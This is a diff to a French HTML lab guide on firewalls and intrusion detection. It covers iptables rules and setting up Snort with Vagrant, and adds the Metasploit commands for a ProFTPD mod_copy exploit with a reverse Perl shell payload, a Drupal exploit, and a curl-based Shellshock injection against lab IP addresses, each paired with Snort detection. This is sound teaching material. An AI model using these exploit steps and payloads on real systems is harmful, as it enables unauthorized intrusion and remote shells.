@@ -6268,11 +6268,23 @@ end</code></pre>
 -A FORWARD -j REJECT
 
 COMMIT</code></pre>
+                    <p>La ligne <span class="em">*filter</span> dit qu'on travaille dans la table <span class="em">filter</span> (la plus classique) qui, elle, sert à <span class="em">autoriser/bloquer le trafic</span>.</p>
+                    <p>La ligne <span class="em">-A INPUT -i lo -j ACCEPT</span> indique qu'on autorise tout le trafic venant de <span class="em">localhost (lo)</span>.</p>
+                    <p>La ligne <span class="em">-A INPUT ! -i lo -s 127.0.0.0/8 -j REJECT</span> permet de bloquer toute tentative d'usurpation. C'est-à-dire, si une IP <span class="em">127.X.X.X</span> arrive <span class="em">pas via lo</span> = spoofing &#8594; rejeté.</p>
+                    <p>La ligne <span class="em">-A INPUT -p icmp -m state --state NEW --icmp-type 8 -j ACCEPT</span> autorise les <span class="em">pings entrants</span> (<span class="em">icmp-type 8</span> = echo request).</p>
+                    <p>La ligne <span class="em">-A INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT</span> dit qu'on autorise les connexions SSH (port 22).</p>
+                    <p>Les lignes <span class="em">-A INPUT -p tcp --dport 80 -m state --state NEW -j ACCEPT</span> et <span class="em">-A INPUT -p tcp --dport 443 -m state --state NEW -j ACCEPT</span> autorise respectivement HTTP (80) et HTTPS (443). Donc, ton serveur web est accessible.</p>
+                    <p>La ligne <span class="em">-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</span> permet d'autoriser les réponses à des connexions déjà ouvertes et les connexions liées. Super important sinon rien ne fonctionne correctement.</p>
+                    <p>La ligne <span class="em">-A INPUT -m limit --limit 5/min -j LOG --log-prefix "iptables_INPUT_denied: " --log-level 7</span> indique qu'on log les paquets refusés (max 5/min). C'est util pour le débogage.</p>
+                    <p>La ligne <span class="em">-A INPUT -j REJECT</span> dit que tout ce qui n'est pas autorisé est rejeté. Politique : <span class="em">deny by default</span>.</p>
+                    <p>La ligne <span class="em">-A FORWARD -m limit --limit 5/min -j LOG --log-prefix "iptables_FORWARD_denied: " --log-level 7</span> permet de logger les paquets en transit refusés.</p>
+                    <p>La ligne <span class="em">-A FORWARD -j REJECT</span> bloque tout routage. Donc, la machine ne sert pas de routeur.</p>
+                    <p>La ligne <span class="em">COMMIT</span> dit qu'on applique toutes les règles.</p>
                    <h4>Configuration du firewall :</h4>
                    <img src="../images/iptables_acces_logique_filtrage_interne_noyau_2.PNG" alt=""> 
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
-<pre><code>nano /vagrant/out/v4.tex</code></pre>
 <pre><code>sudo iptables-restore &lt; v4</code></pre>
+                    <p>En résumé, le fichier `<span class="em">v4</span>` est un fichier de règles iptables. Il configure le pare-feu Linux (table <span class="em">filter</span>).</p>
 <pre><code>sudo iptables -vL --line-numbers</code></pre>
                     <h3>Accès à une machine sécurisée :</h3>
                     <h4>Services disponibles :</h4>
@@ -6356,6 +6368,45 @@ COMMIT</code></pre>
                             </ul>
                         </li>
                     </ul>
+                    <p>Voici les différentes étapes à faire :</p>
+                    <ol>
+                        <li>
+<pre><code>vagrant up</code></pre>
+                        </li>
+                        <li>
+                            <p>Attendre que tout soit prêt.</p>
+                        </li>
+                        <li>
+                            <p>Récupérer le port SSH avec la commande suivante :</p>
+<pre><code>vagrant port</code></pre>
+                        </li>
+                        <li>
+<pre><code>./copy-snort-conf.sh &lt;PORT&gt;</code></pre>
+                            <p>Ce script sert à copier ta configuration Snort personnalisée dans la VM.</p>
+                            <div class="important">
+                                <img src="../images/important.png" alt="Important" class="float_left">
+                                <p>Tu dois relancer ce script à chaque fois que tu modifies tes règles Snort ou si la VM est recréée (<span class="em">vagrant destroy</span>).</p>
+                            </div>
+                            <p>Voici le contenu du fichier `<span class="em">copy-snort-conf.sh</span>` :</p>
+<pre><code>#! /bin/bash
+
+sftp -s "sudo /usr/lib/openssh/sftp-server" -i .vagrant/machines/ub1404/virtualbox/private_key -P "$1" -o StrictHostKeyChecking=no vagrant@127.0.0.1 &lt;&lt;EOF
+put -fr ./snort-conf/* /etc/snort
+exit
+EOF</code></pre>
+                        </li>
+                        <li>
+<pre><code>vagrant ssh</code></pre>
+                        </li>
+                        <li>
+<pre><code>./start-snort.sh</code></pre>
+                            <p>Ce script sert à lancer Snort pour surveiller le trafic.</p>
+                            <p>Voici le contenu du fichier `<span class="em">start-snort.sh</span>` :</p>
+<pre><code>#! /bin/bash
+
+sudo snort -A console -u snort -g snort -c /etc/snort/snort.conf -i eth1 -k none</code></pre>
+                        </li>
+                    </ol>
                     <h3>Snort : Règles :</h3>
                     <h4>/etc/snort/snort.conf :</h4>
                     <img src="../images/snort_regles.PNG" alt="">
@@ -6367,25 +6418,39 @@ COMMIT</code></pre>
                     <h3>proFTP exploit :</h3>
                     <h4>Configuration Metasploit Framework :</h4>
                     <img src="../images/proFTP_exploit_1.PNG" alt="">
+                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
+<pre><code>use exploit/unix/ftp/proftp_modcopy_exec</code></pre>
+<pre><code>set payload cmd/unix/reverse_per1</code></pre>
+<pre><code>set -g rhosts 172.28.128.3</code></pre>
+<pre><code>set -g lhost 172.28.128.1</code></pre>
+<pre><code>set sitepath /var/www/html</code></pre>
                     <h4>Résumé configuration Metasploit Framework :</h4>
                     <img src="../images/proFTP_exploit_2.PNG" alt="">
+<pre><code>options</code></pre>
                     <h4>Exploitation :</h4>
                     <img src="../images/proFTP_exploit_3.PNG" alt="">
+<pre><code>run</code></pre>
                     <h4>Détection :</h4>
                     <img src="../images/proFTP_exploit_4.PNG" alt="">
                     <h4>Contenu règle :</h4>
                     <img src="../images/proFTP_exploit_5.PNG" alt="">
+                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
+<pre><code>cd /etc/snort/rules</code></pre>
+<pre><code>grep "sid:1356" *</code></pre>
                     <h4>Vulnérabilité :</h4>
                     <img src="../images/proFTP_exploit_6.PNG" alt="">
+<pre><code>info</code></pre>
                     <h4>Payload :</h4>
                     <p><a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/cmd/unix/reverse_perl.rb" target="_blank">https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/cmd/unix/reverse_perl.rb</a></p>
                     <img src="../images/proFTP_exploit_7.PNG" alt="">
                     <h3>Shellshock (bug présent depuis 1989 (!)) :</h3>
                     <h4>Metasploit Framework :</h4>
                     <img src="../images/shellshock_1.PNG" alt="">
+<pre><code>options</code></pre>
                     <img src="../images/shellshock_2.PNG" alt="">
                     <h4>Exploitation :</h4>
                     <img src="../images/shellshock_3.PNG" alt="">
+<pre><code>run</code></pre>
                     <h4>Détection :</h4>
                     <img src="../images/shellshock_4.PNG" alt="">
                     <img src="../images/shellshock_5.PNG" alt="">
@@ -6393,16 +6458,25 @@ COMMIT</code></pre>
                     <p><a href="https://www.infosecarticles.com/exploiting-shellshock-vulnerability/" target="_blank">https://www.infosecarticles.com/exploiting-shellshock-vulnerability/</a></p>
                     <h4>Exploitation détaillée :</h4>
                     <img src="../images/shellshock_6.PNG" alt="">
+                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
+<pre><code>bash -c /var/www/cgi-bin/hello_world.sh</code></pre>
+                    <p>Dans la machine hôte :</p>
+<pre><code>curl https://172.28.128.3/cgi-bin/hello_world.sh</code></pre>
+<pre><code>curl -A "() { echo sans danger ; }; echo Content-Type: text/plain ; echo ; echo; echo dangereux" http://172.28.128.3/cgi-bin/hello_world.sh</code></pre>
                     <h4>Règle détaillée :</h4>
                     <h5>Contenu règle :</h5>
                     <img src="../images/shellshock_7.PNG" alt="">
+<pre><code>cd /etc/snort/rules</code></pre>
+<pre><code>grep sid:20222028 *</code></pre>
                     <h3>Drupal exploit :</h3>
                     <h4>Configuration Metasploit Framework :</h4>
                     <img src="../images/drupal_exploit_1.PNG" alt="">
+<pre><code>use exploit/unix/webapp/drupal_coder_exe</code></pre>
                     <h4>Résumé configuration Metasploit Framework :</h4>
                     <img src="../images/drupal_exploit_2.PNG" alt="">
                     <h4>Exploitation :</h4>
                     <img src="../images/drupal_exploit_3.PNG" alt="">
+<pre><code>run</code></pre>
                     <h4>Détection :</h4>
                     <p>(Néant)</p>
                 </article>
